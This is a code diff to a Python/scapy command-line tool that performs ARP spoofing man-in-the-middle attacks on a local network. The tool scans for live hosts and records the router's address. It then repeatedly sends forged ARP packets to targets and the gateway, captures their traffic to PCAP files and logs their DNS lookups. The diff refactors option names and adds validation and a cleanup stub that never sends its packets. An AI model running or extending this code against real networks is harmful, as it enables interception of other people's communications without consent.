@@ -21,6 +21,9 @@ END = '\033[0m'
 
 ExitQueue = Queue.Queue(maxsize=1)
 
+global RouterInfo
+RouterInfo = {}
+
 
 class ArpUtils(object):
 
@@ -44,6 +47,12 @@ class ArpUtils(object):
                                'capturing data in the process.',
 
                 'Object': self.ArpSpoof,
+
+                'Vars': {
+
+                    'live_hosts': []
+
+                },
 
                 'Options': {
 
@@ -96,28 +105,28 @@ class ArpUtils(object):
                         'Value': True
                     },
 
-                    'Iface': {
+                    'iface': {
                         'Name': 'Iface',
                         'Description': 'Name of the interface you wish to use to send the packets.',
                         'Type': str,
                         'Value': 'eth0'
                     },
 
-                    'Gateway': {
+                    'gateway': {
                         'Name': 'Gateway',
                         'Description': 'IP Address of the common gateway between you and your targets.',
                         'Type': str,
                         'Value': ''
                     },
 
-                    'Path': {
+                    'path': {
                         'Name': 'Path',
                         'Description': 'Path in which attack related files are to be stored',
                         'Type': str,
                         'Value': None
                     },
 
-                    'Pcap': {
+                    'pcap': {
                         'Name': 'Pcap',
                         'Description': 'File name for packet capture file.',
                         'Type': str,
@@ -225,7 +234,7 @@ class ArpUtils(object):
         """
 
         def __init__(self, attack, interface, gateway):
-            self.attack = attack['Options']
+            self.attack = attack
 
             # Set date/time variables to the current date / time
             # so that PCAP files can be saved using a unique
@@ -236,27 +245,27 @@ class ArpUtils(object):
             # If the user has not set a name for the capture file, set
             # it to 'capture.pcap'
 
-            if self.attack['Options']['Pcap']['Value'] is None:
-                self.attack['Options']['Pcap']['Value'] = 'capture.pcap'
+            if self.attack['Options']['pcap']['Value'] is None:
+                self.attack['Options']['pcap']['Value'] = 'capture.pcap'
 
             # If the user has not set a path for this attack session, set
             # it to 'ARP-SP-<DD>\<MM>\<YY>-<HH>:<MM>:<SS>'
 
-            if self.attack['Options']['Path']['Value'] is None:
-                self.attack['Options']['Path']['Value'] = 'ARP-SP-%s' % self.fnow
+            if self.attack['Options']['path']['Value'] is None:
+                self.attack['Options']['path']['Value'] = 'ARP-SP-%s' % self.fnow
 
             # If the user has not created the directory pointed to by 'Path',
             # create it.
 
-            if not os.path.exists(os.path.abspath(self.attack['Options']['Path']['Value'])):
-                os.mkdir(os.path.abspath(self.attack['Options']['Path']['Value']))
+            if not os.path.exists(os.path.abspath(self.attack['Options']['path']['Value'])):
+                os.mkdir(os.path.abspath(self.attack['Options']['path']['Value']))
 
             # Create temporary variables for 'Gateway' and 'Iface', so
             # that the values can be checked before being set to another
             # value.
 
-            tgway = self.attack['Options']['Gateway']['Value']
-            tiface = self.attack['Options']['Iface']['Value']
+            tgway = self.attack['Options']['gateway']['Value']
+            tiface = self.attack['Options']['iface']['Value']
 
             # If temporary Iface, and temporary Gateway (set values),
             # are empty.
@@ -271,8 +280,8 @@ class ArpUtils(object):
                     # Set 'Gateway' and 'Iface' to the values passed
                     # to the __init__() function.
 
-                    self.attack['Options']['Gateway']['Value'] = gateway
-                    self.attack['Options']['Iface']['Value'] = interface
+                    self.attack['Options']['gateway']['Value'] = gateway
+                    self.attack['Options']['iface']['Value'] = interface
                 else:
                     raise Exception('Please set interface and gateway options using the set command.')
 
@@ -311,11 +320,11 @@ class ArpUtils(object):
 
             def filter_packets(self, pkt):
 
-                options = self.attack['Options']['DNSUtils']['Options']
-                path = self.attack['Options']['Path']['Value']
+                options = self.attack['Options']['dnsutils']['Options']
+                path = self.attack['Options']['path']['Value']
 
                 # If user does not want to log DNS requests, return
-                if not options['LogDNS']['Value']:
+                if not options['logdns']['Value']:
                     return
 
                 # If packet has no IP layer, return
@@ -337,15 +346,14 @@ class ArpUtils(object):
                     return
 
                 # Has the user set 'PrintDNS' option to True.
-                if options['LogDNS']['Options']['PrintDNS']['Value'] is True:
-
-                    options = options['LogDNS']['Options']['PrintDNS']['Options']
+                if options['printdns']['Value'] is True:
+                    options = options['printdns']['Options']
 
                     # Should duplicate hostnames be printed, if not,
                     # check for presence in DNS log, else print without
                     # check.
 
-                    if options['UniqueOnly']['Value'] is True:
+                    if options['uniqueonly']['Value'] is True:
                         with open(os.path.abspath('%s/%s' % (path, ip)), 'a+') as handle:
 
                             # Go through all lines in file checking for
@@ -410,21 +418,30 @@ class ArpUtils(object):
 
                 # Add in checks to make sure that all required options have been set.
 
-                path = os.path.abspath('%s/%s' % (self.attack['Options']['Path']['Value'],
-                                                  self.attack['Options']['Pcap']['Value']))
+                if self.attack['Options']['gateway']['Value'] == '':
+                    raise Exception('Gateway value must be set.')
+                elif self.attack['Options']['iface']['Value'] == '':
+                    raise Exception('Ifact value must be set.')
+                elif self.attack['Options']['targets']['Value'] is []:
+                    raise Exception('At least one target must be specified')
+                elif self.attack['Vars']['live_hosts'] is []:
+                    raise Exception('Must perform a scan before starting attack.')
+
+                path = os.path.abspath('%s/%s' % (self.attack['Options']['path']['Value'],
+                                                  self.attack['Options']['pcap']['Value']))
 
                 self.handle = PcapWriter(filename=path, append=True)
-                pkt_filter = self.create_filter(self.attack['Options']['Gateway']['Value'],
-                                                self.attack['Options']['Targets']['Value'])
+                pkt_filter = self.create_filter(self.attack['Options']['gateway']['Value'],
+                                                self.attack['Options']['targets']['Value'])
 
                 # While the thread is alive, append packets to the PCAP file, flushing the buffer
                 # after each packet, to make sure that the file is constantly updated.
 
                 while True:
                     if ExitQueue.full():
-                        return
+                        self.exit()
 
-                    pkt = sniff(filter=pkt_filter, iface=self.attack['Options']['Iface']['Value'], count=1,
+                    pkt = sniff(filter=pkt_filter, iface=self.attack['Options']['iface']['Value'], count=1,
                                 prn=self.filter_packets)
 
                     self.handle.write(pkt)
@@ -440,6 +457,13 @@ class ArpUtils(object):
         # and also for sending the crafted ARP packets to
         # selected targets.
 
+        def cleanup(self, target_list):
+            for target in target_list:
+                for host in self.attack['Vars']['live_hosts']:
+                    if target == host['IP']:
+                        mal_packet_h = Ether(src=RouterInfo['MAC'])/ARP(psrc=self.attack['Options']['gateway']['Value'], pdst=target)
+                        mal_packet_g = Ether(src=host['MAC'])/ARP(psrc=target, pdst=self.attack['Options']['gateway']['Value'])
+
         def run(self):
             sniffer_thread = self.SniffPackets(self.attack)  # Initialise SniffPackets thread.
             sniffer_thread.setDaemon(True)                   # Make sure thread is killed upon exit.
@@ -449,11 +473,13 @@ class ArpUtils(object):
             # to keep targets sending data through the attacking computer.
 
             try:
-                while True:
-                    if ExitQueue.full():
-                        return
+                target_list = self.attack['Options']['targets']['Value']
 
-                    target_list = self.attack['Options']['Targets']['Value']
+                while True:
+
+                    if ExitQueue.full():
+                        self.cleanup(target_list)
+                        return
 
                     # For each target in the target list, create two malicious
                     # packets - one to be sent to the gateway, and one to be
@@ -461,8 +487,8 @@ class ArpUtils(object):
                     # destinations. Sleep 1 second, then repeat.
 
                     for target in target_list:
-                        mal_packet_h = ARP(psrc=self.attack['Options']['Gateway']['Value'], pdst=target)
-                        mal_packet_g = ARP(psrc=target, pdst=self.attack['Options']['Gateway']['Value'])
+                        mal_packet_h = ARP(psrc=self.attack['Options']['gateway']['Value'], pdst=target)
+                        mal_packet_g = ARP(psrc=target, pdst=self.attack['Options']['gateway']['Value'])
 
                         send(mal_packet_g, verbose=False)  # Send crafted ARP packet.
                         send(mal_packet_h, verbose=False)
@@ -496,8 +522,8 @@ class ArpUtils(object):
         self.attack = self.attacks[self.selected]
 
         #print('Attack with id \'%d\', selected (%s)' % (command[0], self.attack['Description']))
-        self.attack['Options']['Gateway']['Value'] = self.gateway
-        self.attack['Options']['Iface']['Value'] = self.iface
+        self.attack['Options']['gateway']['Value'] = self.gateway
+        self.attack['Options']['iface']['Value'] = self.iface
 
         return
 
@@ -746,16 +772,18 @@ class ArpUtils(object):
         if self.selected is None:
             raise Exception('%sSelect%s an %sattack%s before using the \'scan\' command.' % (BLUE, END, GREEN, END))
 
-        if self.attack['Options']['Gateway']['Value'] == '':
+        if self.attack['Options']['gateway']['Value'] == '':
             raise Exception('%sSet%s a %sgateway%s before using the \'scan\' command.' % (BLUE, END, GREEN, END))
 
-        if self.attack['Options']['Iface']['Value'] == '':
+        if self.attack['Options']['iface']['Value'] == '':
             raise Exception('%sSet%s an %sinterface%s before using the \'scan\' command.' % (BLUE, END, GREEN, END))
 
         try:
             self.live_hosts = self.scan(interface=self.iface, gateway=self.gateway)
         except Exception:
             self.live_hosts = self.scan()
+
+        self.attack['Vars']['live_hosts'] = self.live_hosts
 
     # This function of the ArpUtils class is responsible for
     # printing help about the ArpUtils.py to the screen.
@@ -866,10 +894,10 @@ class ArpUtils(object):
               '  Path: %s\n'
               '  Pcap: %s\n\n'
               '  Targets:\n'
-              '    %s' % (str(options['Gateway']['Value']),
-                          str(options['Iface']['Value']),
-                          str(options['Path']['Value']),
-                          str(options['Pcap']['Value']),
+              '    %s' % (str(options['gateway']['Value']),
+                          str(options['iface']['Value']),
+                          str(options['path']['Value']),
+                          str(options['pcap']['Value']),
                           str(self.wrapped_list(options['targets']))
                         ))
 
@@ -977,18 +1005,19 @@ class ArpUtils(object):
     # proceed to target
 
     def scan(self, gateway='', interface=''):
+        global RouterInfo
 
         if gateway == '':
-            if self.attack['Options']['Gateway']['Value'] == '':
-                raise Exception('Please set default gateway before scanning')
+            if self.attack['Options']['gateway']['Value'] == '':
+                raise Exception('Please set gateway before scanning')
             else:
-                gateway = self.attack['Options']['Gateway']['Value']
+                gateway = self.attack['Options']['gateway']['Value']
 
         if interface == '':
-            if self.attack['Options']['Iface']['Value'] == '':
-                raise Exception('Please set default interface before scanning')
+            if self.attack['Options']['iface']['Value'] == '':
+                raise Exception('Please set interface before scanning')
             else:
-                interface = self.attack['Options']['Iface']['Value']
+                interface = self.attack['Options']['iface']['Value']
 
         cidr_addr = '%s.%s.%s.0/24' % tuple(gateway.split('.')[0:3])
         live_hosts = []
@@ -1005,6 +1034,11 @@ class ArpUtils(object):
                     'MAC': response.sprintf('%Ether.src%'),
                     'IP': response.sprintf('%ARP.psrc%')
                 })
+            else:
+                RouterInfo = {
+                    'MAC': response.sprintf('%Ether.src%'),
+                    'IP': response.sprintf('%ARP.psrc%')
+                }
 
         if live_hosts == []:
             print('No hosts detected on network, other than you and the gateway. Exiting scan.')
@@ -1043,7 +1077,7 @@ class ArpUtils(object):
             if ExitQueue.full():
                 print('Exiting!')
                 break
-                
+
             try:
                 if self.selected is None:
                     input_attack = '%sNONE%s' % (RED, END)
@@ -1059,13 +1093,14 @@ class ArpUtils(object):
                 if uinput != []:
                     uinput = map(lower, uinput)
 
-                    if uinput[0] == 'perform':
-                        self.command_list[uinput[0]]['Object'].__call__(self.attack, self.iface, self.gateway)
-                    else:
-                        self.command_list[uinput[0]]['Object'].__call__(uinput[1:])
+                    if uinput[0] in self.command_list:
+                        if uinput[0] == 'perform':
+                            self.command_list[uinput[0]]['Object'].__call__(self.attack, self.iface, self.gateway)
+                        else:
+                            self.command_list[uinput[0]]['Object'].__call__(uinput[1:])
 
             except Exception as ex:
-                pass
+                print(ex.message)
 
 
 def lower(s):
